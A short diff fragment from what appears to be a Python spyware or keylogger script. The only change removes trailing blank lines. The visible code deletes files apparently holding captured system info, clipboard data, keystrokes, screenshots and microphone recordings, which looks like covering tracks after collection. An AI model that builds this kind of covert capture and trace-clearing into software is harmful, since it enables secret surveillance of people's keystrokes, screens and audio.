@@ -223,5 +223,3 @@ delete_files = [com_info, clip_info, key_info, screenshot_info, mic_info]
 for file in delete_files:
     os.remove(file_merge + file)
 
-
-
